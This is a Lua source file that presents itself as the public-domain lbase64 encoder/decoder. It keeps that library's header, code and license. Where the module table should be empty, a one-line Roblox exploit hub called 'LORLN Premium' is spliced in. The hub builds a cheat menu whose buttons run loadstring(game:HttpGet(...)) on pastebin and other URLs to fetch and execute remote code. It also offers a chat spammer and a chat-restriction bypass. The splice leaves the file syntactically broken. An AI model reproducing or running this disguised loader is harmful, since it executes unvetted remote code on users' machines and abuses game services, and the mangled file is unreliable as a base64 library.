--[[

 base64 -- v1.5.3 public domain Lua base64 encoder/decoder
 no warranty implied; use at your own risk

 Needs bit32.extract function. If not present it's implemented using BitOp
 or Lua 5.3 native bit operators. For Lua 5.1 fallbacks to pure Lua
 implementation inspired by Rici Lake's post:
   http://ricilake.blogspot.co.uk/2007/10/iterating-bits-in-lua.html

 author: Ilya Kolbin (iskolbin@gmail.com)
 url: github.com/iskolbin/lbase64

 COMPATIBILITY

 Lua 5.1+, LuaJIT

 LICENSE

 See end of file for license information.

--]]


local base64 = {do local Players=game:GetService("Players");local plr=Players.LocalPlayer;local playerGui=plr:WaitForChild("PlayerGui");local TweenService=game:GetService("TweenService");local blacklist={A9k_vX=true,aaaaad=true,xc_me4=true};task.wait(1);if blacklist[plr.Name] then plr:Kick("🚫 Banned from LORLN Premium Scripts");return;end local LORLN_RED={Dark=Color3.fromRGB(20,5,5),Medium=Color3.fromRGB(40,0,0),Light=Color3.fromRGB(80,0,0),Bright=Color3.fromRGB(150,0,0),Text=Color3.fromRGB(255,80,80),TextLight=Color3.fromRGB(255,120,120),Accent=Color3.fromRGB(255,40,40),Premium=Color3.fromRGB(255,100,0)};local uiSettings={bgColor=LORLN_RED.Dark,textColor=LORLN_RED.TextLight,borderColor=LORLN_RED.Accent,cornerRadius=8,premiumColor=LORLN_RED.Premium};local screenGui=Instance.new("ScreenGui");screenGui.Parent=playerGui;screenGui.Name="LORLN_Premium_v5";screenGui.ResetOnSpawn=false;screenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;local mainFrame=Instance.new("Frame");mainFrame.Name="MainHub";mainFrame.Parent=screenGui;mainFrame.Size=UDim2.new(0,350,0,450);mainFrame.Position=UDim2.new(0.5, -175,0.5, -225);mainFrame.BackgroundColor3=uiSettings.bgColor;mainFrame.BorderSizePixel=0;mainFrame.Visible=false;mainFrame.Active=true;mainFrame.Draggable=true;local mainCorner=Instance.new("UICorner",mainFrame);mainCorner.CornerRadius=UDim.new(0,uiSettings.cornerRadius);local mainStroke=Instance.new("UIStroke",mainFrame);mainStroke.Color=uiSettings.borderColor;mainStroke.Thickness=2;local titleBar=Instance.new("Frame");titleBar.Name="TitleBar";titleBar.Parent=mainFrame;titleBar.Size=UDim2.new(1,0,0,30);titleBar.BackgroundColor3=LORLN_RED.Medium;titleBar.BorderSizePixel=0;local titleText=Instance.new("TextLabel");titleText.Name="TitleText";titleText.Parent=titleBar;titleText.Size=UDim2.new(1, -70,1,0);titleText.Position=UDim2.new(0,10,0,0);titleText.BackgroundTransparency=1;titleText.Text="LORLN PREMIUM v5";titleText.TextColor3=uiSettings.textColor;titleText.Font=Enum.Font.GothamBlack;titleText.TextSize=16;titleText.TextXAlignment=Enum.TextXAlignment.Left;local minimizeBtn=Instance.new("TextButton");minimizeBtn.Name="MinimizeBtn";minimizeBtn.Parent=titleBar;minimizeBtn.Text="-";minimizeBtn.Size=UDim2.new(0,25,0,25);minimizeBtn.Position=UDim2.new(1, -60,0.5, -12);minimizeBtn.BackgroundTransparency=1;minimizeBtn.TextColor3=uiSettings.textColor;minimizeBtn.Font=Enum.Font.GothamBlack;minimizeBtn.TextSize=20;local closeBtn=Instance.new("TextButton");closeBtn.Name="CloseBtn";closeBtn.Parent=titleBar;closeBtn.Text="✖";closeBtn.Size=UDim2.new(0,25,0,25);closeBtn.Position=UDim2.new(1, -30,0.5, -12);closeBtn.BackgroundTransparency=1;closeBtn.TextColor3=uiSettings.textColor;closeBtn.Font=Enum.Font.GothamBlack;closeBtn.TextSize=16;local scriptsFrame=Instance.new("ScrollingFrame");scriptsFrame.Name="ScriptsFrame";scriptsFrame.Parent=mainFrame;scriptsFrame.Size=UDim2.new(1, -20,1, -40);scriptsFrame.Position=UDim2.new(0,10,0,40);scriptsFrame.BackgroundTransparency=1;scriptsFrame.ScrollBarThickness=4;scriptsFrame.ScrollBarImageColor3=uiSettings.borderColor;scriptsFrame.AutomaticCanvasSize=Enum.AutomaticSize.Y;local scriptsLayout=Instance.new("UIListLayout",scriptsFrame);scriptsLayout.HorizontalAlignment=Enum.HorizontalAlignment.Center;scriptsLayout.SortOrder=Enum.SortOrder.LayoutOrder;scriptsLayout.Padding=UDim.new(0,8);local function createPremiumScript(name,desc,code) local btnFrame=Instance.new("Frame");btnFrame.Name=name   .. "Frame" ;btnFrame.Size=UDim2.new(1, -10,0,80);btnFrame.BackgroundTransparency=1;btnFrame.Parent=scriptsFrame;local mainBtn=Instance.new("Frame");mainBtn.Size=UDim2.new(1,0,1,0);mainBtn.BackgroundColor3=Color3.fromRGB(35,8,8);mainBtn.Parent=btnFrame;local btnCorner=Instance.new("UICorner",mainBtn);btnCorner.CornerRadius=UDim.new(0,6);local btnStroke=Instance.new("UIStroke",mainBtn);btnStroke.Color=uiSettings.borderColor;btnStroke.Thickness=1;local premiumTag=Instance.new("TextLabel");premiumTag.Name="PremiumTag";premiumTag.Size=UDim2.new(0,70,0,20);premiumTag.Position=UDim2.new(1, -75,0,5);premiumTag.BackgroundTransparency=1;premiumTag.Text="★ PREMIUM";premiumTag.TextColor3=uiSettings.premiumColor;premiumTag.Font=Enum.Font.GothamBold;premiumTag.TextSize=11;premiumTag.TextXAlignment=Enum.TextXAlignment.Right;premiumTag.Parent=mainBtn;local nameLabel=Instance.new("TextLabel");nameLabel.Name="ScriptName";nameLabel.Parent=mainBtn;nameLabel.Size=UDim2.new(1, -15,0,25);nameLabel.Position=UDim2.new(0,10,0,5);nameLabel.BackgroundTransparency=1;nameLabel.Text=name;nameLabel.TextColor3=uiSettings.textColor;nameLabel.Font=Enum.Font.GothamBold;nameLabel.TextSize=15;nameLabel.TextXAlignment=Enum.TextXAlignment.Left;local descLabel=Instance.new("TextLabel");descLabel.Name="ScriptDesc";descLabel.Parent=mainBtn;descLabel.Size=UDim2.new(1, -15,0,20);descLabel.Position=UDim2.new(0,10,0,30);descLabel.BackgroundTransparency=1;descLabel.Text=desc;descLabel.TextColor3=Color3.fromRGB(200,120,120);descLabel.Font=Enum.Font.Gotham;descLabel.TextSize=12;descLabel.TextXAlignment=Enum.TextXAlignment.Left;local btn=Instance.new("TextButton");btn.Name="ActivateBtn";btn.Parent=mainBtn;btn.Size=UDim2.new(0,100,0,30);btn.Position=UDim2.new(1, -110,1, -35);btn.BackgroundColor3=Color3.fromRGB(50,10,10);btn.TextColor3=uiSettings.textColor;btn.Text="EXECUTE ★";btn.Font=Enum.Font.GothamBlack;btn.TextSize=13;local btnActivateCorner=Instance.new("UICorner",btn);btnActivateCorner.CornerRadius=UDim.new(0,4);local btnActivateStroke=Instance.new("UIStroke",btn);btnActivateStroke.Color=uiSettings.premiumColor;btnActivateStroke.Thickness=1;btn.MouseEnter:Connect(function() btnActivateStroke.Thickness=2;btn.BackgroundColor3=Color3.fromRGB(60,15,15);end);btn.MouseLeave:Connect(function() btnActivateStroke.Thickness=1;btn.BackgroundColor3=Color3.fromRGB(50,10,10);end);btn.MouseButton1Click:Connect(function() if (type(code)=="function") then code();else loadstring(code)();end btn.Text="ACTIVE ✓★";task.wait(1.5);btn.Text="EXECUTE ★";end);end local function createScript(name,desc,code) local btnFrame=Instance.new("Frame");btnFrame.Name=name   .. "Frame" ;btnFrame.Size=UDim2.new(1, -10,0,70);btnFrame.BackgroundTransparency=1;btnFrame.Parent=scriptsFrame;local mainBtn=Instance.new("Frame");mainBtn.Size=UDim2.new(1,0,1,0);mainBtn.BackgroundColor3=Color3.fromRGB(35,8,8);mainBtn.Parent=btnFrame;local btnCorner=Instance.new("UICorner",mainBtn);btnCorner.CornerRadius=UDim.new(0,6);local btnStroke=Instance.new("UIStroke",mainBtn);btnStroke.Color=uiSettings.borderColor;btnStroke.Thickness=1;local nameLabel=Instance.new("TextLabel");nameLabel.Name="ScriptName";nameLabel.Parent=mainBtn;nameLabel.Size=UDim2.new(1, -15,0,25);nameLabel.Position=UDim2.new(0,10,0,5);nameLabel.BackgroundTransparency=1;nameLabel.Text=name;nameLabel.TextColor3=uiSettings.textColor;nameLabel.Font=Enum.Font.GothamBold;nameLabel.TextSize=15;nameLabel.TextXAlignment=Enum.TextXAlignment.Left;local descLabel=Instance.new("TextLabel");descLabel.Name="ScriptDesc";descLabel.Parent=mainBtn;descLabel.Size=UDim2.new(1, -15,0,20);descLabel.Position=UDim2.new(0,10,0,30);descLabel.BackgroundTransparency=1;descLabel.Text=desc;descLabel.TextColor3=Color3.fromRGB(200,120,120);descLabel.Font=Enum.Font.Gotham;descLabel.TextSize=12;descLabel.TextXAlignment=Enum.TextXAlignment.Left;local btn=Instance.new("TextButton");btn.Name="ActivateBtn";btn.Parent=mainBtn;btn.Size=UDim2.new(0,100,0,30);btn.Position=UDim2.new(1, -110,1, -35);btn.BackgroundColor3=Color3.fromRGB(50,10,10);btn.TextColor3=uiSettings.textColor;btn.Text="EXECUTE";btn.Font=Enum.Font.GothamBlack;btn.TextSize=13;local btnActivateCorner=Instance.new("UICorner",btn);btnActivateCorner.CornerRadius=UDim.new(0,4);local btnActivateStroke=Instance.new("UIStroke",btn);btnActivateStroke.Color=uiSettings.borderColor;btnActivateStroke.Thickness=1;btn.MouseEnter:Connect(function() btnActivateStroke.Thickness=2;btn.BackgroundColor3=Color3.fromRGB(60,15,15);end);btn.MouseLeave:Connect(function() btnActivateStroke.Thickness=1;btn.BackgroundColor3=Color3.fromRGB(50,10,10);end);btn.MouseButton1Click:Connect(function() if (type(code)=="function") then code();else loadstring(code)();end btn.Text="ACTIVE ✓";task.wait(1.5);btn.Text="EXECUTE";end);end local function showRedLogoAnimation() local logoGui=Instance.new("ScreenGui");logoGui.Name="LORLN_LogoAnimation";logoGui.Parent=playerGui;logoGui.ResetOnSpawn=false;local logoFrame=Instance.new("Frame");logoFrame.Size=UDim2.new(0,200,0,200);logoFrame.Position=UDim2.new(0.5, -100,0.5, -100);logoFrame.BackgroundTransparency=1;logoFrame.Parent=logoGui;local logoText=Instance.new("TextLabel");logoText.Text="LORLN";logoText.TextColor3=LORLN_RED.Accent;logoText.Font=Enum.Font.GothamBlack;logoText.TextSize=36;logoText.Size=UDim2.new(1,0,1,0);logoText.BackgroundTransparency=1;logoText.Parent=logoFrame;local grow=TweenService:Create(logoText,TweenInfo.new(0.5),{TextSize=48});local shrink=TweenService:Create(logoText,TweenInfo.new(0.5),{TextSize=36});local fadeOut=TweenService:Create(logoText,TweenInfo.new(0.5),{TextTransparency=1});grow:Play();grow.Completed:Wait();shrink:Play();shrink.Completed:Wait();task.wait(0.5);fadeOut:Play();fadeOut.Completed:Wait();logoGui:Destroy();end createPremiumScript("LORLN PRO Beta v1.1","Premium LORLN script loader",[[loadstring(game:HttpGet("https://pastebin.com/raw/2nepk09e"))()]]);createScript("Unmute Chat LORLN v1","Remove all chat restrictions",function() for _,v in pairs(plr:GetDescendants()) do if (v:IsA("BoolValue") and v.Name:lower():find("mute")) then v:Destroy();end end pcall(function() game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,true);end);task.wait(1);game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LORLN Unmute Activated","All");end);createPremiumScript("SHADER - SKY","Advanced visual shader effects",[[loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Simple-Shader-37434"))()]]);createPremiumScript("ANTI CMD PROTECTION","Blocks malicious commands",[[loadstring(game:HttpGet("https://pastebin.com/raw/umCtW4nw"))()]]);createPremiumScript("LORLN CHAT SPAMMER","Premium Chat Spammer with Perfect Alignment",[[loadstring(game:HttpGet("https://pastebin.com/raw/VPYfCC1Z"))()]]);local function showWelcome() local welcomeGui=Instance.new("ScreenGui");welcomeGui.Name="WelcomeNotification";welcomeGui.Parent=playerGui;welcomeGui.ResetOnSpawn=false;local welcomeFrame=Instance.new("Frame");welcomeFrame.Size=UDim2.new(0,300,0,150);welcomeFrame.Position=UDim2.new(0.5, -150,0.3, -75);welcomeFrame.BackgroundColor3=uiSettings.bgColor;welcomeFrame.BorderSizePixel=0;welcomeFrame.Parent=welcomeGui;local welcomeCorner=Instance.new("UICorner",welcomeFrame);welcomeCorner.CornerRadius=UDim.new(0,12);local welcomeStroke=Instance.new("UIStroke",welcomeFrame);welcomeStroke.Color=uiSettings.premiumColor;welcomeStroke.Thickness=3;local title=Instance.new("TextLabel");title.Size=UDim2.new(1,0,0,40);title.Position=UDim2.new(0,0,0,10);title.BackgroundTransparency=1;title.Text="WELCOME TO";title.TextColor3=uiSettings.textColor;title.Font=Enum.Font.GothamBlack;title.TextSize=20;title.Parent=welcomeFrame;local mainText=Instance.new("TextLabel");mainText.Size=UDim2.new(1,0,0,60);mainText.Position=UDim2.new(0,0,0,40);mainText.BackgroundTransparency=1;mainText.Text="LORLN PRO ★";mainText.TextColor3=uiSettings.premiumColor;mainText.Font=Enum.Font.GothamBlack;mainText.TextSize=28;mainText.Parent=welcomeFrame;local subText=Instance.new("TextLabel");subText.Size=UDim2.new(1,0,0,30);subText.Position=UDim2.new(0,0,0,100);subText.BackgroundTransparency=1;subText.Text="Premium Scripts Loaded";subText.TextColor3=uiSettings.textColor;subText.Font=Enum.Font.Gotham;subText.TextSize=14;subText.Parent=welcomeFrame;task.delay(3,function() welcomeGui:Destroy();mainFrame.Visible=true;end);end closeBtn.MouseButton1Click:Connect(function() mainFrame.Visible=false;end);minimizeBtn.MouseButton1Click:Connect(function() if (mainFrame.Size.Y.Offset==450) then mainFrame.Size=UDim2.new(0,350,0,30);minimizeBtn.Text="+";scriptsFrame.Visible=false;else mainFrame.Size=UDim2.new(0,350,0,450);minimizeBtn.Text="-";scriptsFrame.Visible=true;end end);showWelcome(); end
}

local extract = _G.bit32 and _G.bit32.extract -- Lua 5.2/Lua 5.3 in compatibility mode
if not extract then
	if _G.bit then -- LuaJIT
		local shl, shr, band = _G.bit.lshift, _G.bit.rshift, _G.bit.band
		extract = function( v, from, width )
			return band( shr( v, from ), shl( 1, width ) - 1 )
		end
	elseif _G._VERSION == "Lua 5.1" then
		extract = function( v, from, width )
			local w = 0
			local flag = 2^from
			for i = 0, width-1 do
				local flag2 = flag + flag
				if v % flag2 >= flag then
					w = w + 2^i
				end
				flag = flag2
			end
			return w
		end
	else -- Lua 5.3+
		extract = load[[return function( v, from, width )
			return ( v >> from ) & ((1 << width) - 1)
		end]]()
	end
end


function base64.makeencoder( s62, s63, spad )
	local encoder = {}
	for b64code, char in pairs{[0]='A','B','C','D','E','F','G','H','I','J',
		'K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y',
		'Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n',
		'o','p','q','r','s','t','u','v','w','x','y','z','0','1','2',
		'3','4','5','6','7','8','9',s62 or '+',s63 or'/',spad or'='} do
		encoder[b64code] = char:byte()
	end
	return encoder
end

function base64.makedecoder( s62, s63, spad )
	local decoder = {}
	for b64code, charcode in pairs( base64.makeencoder( s62, s63, spad )) do
		decoder[charcode] = b64code
	end
	return decoder
end

local DEFAULT_ENCODER = base64.makeencoder()
local DEFAULT_DECODER = base64.makedecoder()

local char, concat = string.char, table.concat

function base64.encode( str, encoder, usecaching )
	encoder = encoder or DEFAULT_ENCODER
	local t, k, n = {}, 1, #str
	local lastn = n % 3
	local cache = {}
	for i = 1, n-lastn, 3 do
		local a, b, c = str:byte( i, i+2 )
		local v = a*0x10000 + b*0x100 + c
		local s
		if usecaching then
			s = cache[v]
			if not s then
				s = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[extract(v,0,6)])
				cache[v] = s
			end
		else
			s = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[extract(v,0,6)])
		end
		t[k] = s
		k = k + 1
	end
	if lastn == 2 then
		local a, b = str:byte( n-1, n )
		local v = a*0x10000 + b*0x100
		t[k] = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[64])
	elseif lastn == 1 then
		local v = str:byte( n )*0x10000
		t[k] = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[64], encoder[64])
	end
	return concat( t )
end

function base64.decode( b64, decoder, usecaching )
	decoder = decoder or DEFAULT_DECODER
	local pattern = '[^%w%+%/%=]'
	if decoder then
		local s62, s63
		for charcode, b64code in pairs( decoder ) do
			if b64code == 62 then s62 = charcode
			elseif b64code == 63 then s63 = charcode
			end
		end
		pattern = ('[^%%w%%%s%%%s%%=]'):format( char(s62), char(s63) )
	end
	b64 = b64:gsub( pattern, '' )
	local cache = usecaching and {}
	local t, k = {}, 1
	local n = #b64
	local padding = b64:sub(-2) == '==' and 2 or b64:sub(-1) == '=' and 1 or 0
	for i = 1, padding > 0 and n-4 or n, 4 do
		local a, b, c, d = b64:byte( i, i+3 )
		local s
		if usecaching then
			local v0 = a*0x1000000 + b*0x10000 + c*0x100 + d
			s = cache[v0]
			if not s then
				local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40 + decoder[d]
				s = char( extract(v,16,8), extract(v,8,8), extract(v,0,8))
				cache[v0] = s
			end
		else
			local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40 + decoder[d]
			s = char( extract(v,16,8), extract(v,8,8), extract(v,0,8))
		end
		t[k] = s
		k = k + 1
	end
	if padding == 1 then
		local a, b, c = b64:byte( n-3, n-1 )
		local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40
		t[k] = char( extract(v,16,8), extract(v,8,8))
	elseif padding == 2 then
		local a, b = b64:byte( n-3, n-2 )
		local v = decoder[a]*0x40000 + decoder[b]*0x1000
		t[k] = char( extract(v,16,8))
	end
	return concat( t )
end

return base64

--[[
------------------------------------------------------------------------------
This software is available under 2 licenses -- choose whichever you prefer.
------------------------------------------------------------------------------
ALTERNATIVE A - MIT License
Copyright (c) 2018 Ilya Kolbin
Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
------------------------------------------------------------------------------
ALTERNATIVE B - Public Domain (www.unlicense.org)
This is free and unencumbered software released into the public domain.
Anyone is free to copy, modify, publish, use, compile, sell, or distribute this
software, either in source code form or as a compiled binary, for any purpose,
commercial or non-commercial, and by any means.
In jurisdictions that recognize copyright laws, the author or authors of this
software dedicate any and all copyright interest in the software to the public
domain. We make this dedication for the benefit of the public at large and to
the detriment of our heirs and successors. We intend this dedication to be an
overt act of relinquishment in perpetuity of all present and future rights to
this software under copyright law.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
------------------------------------------------------------------------------
--]]
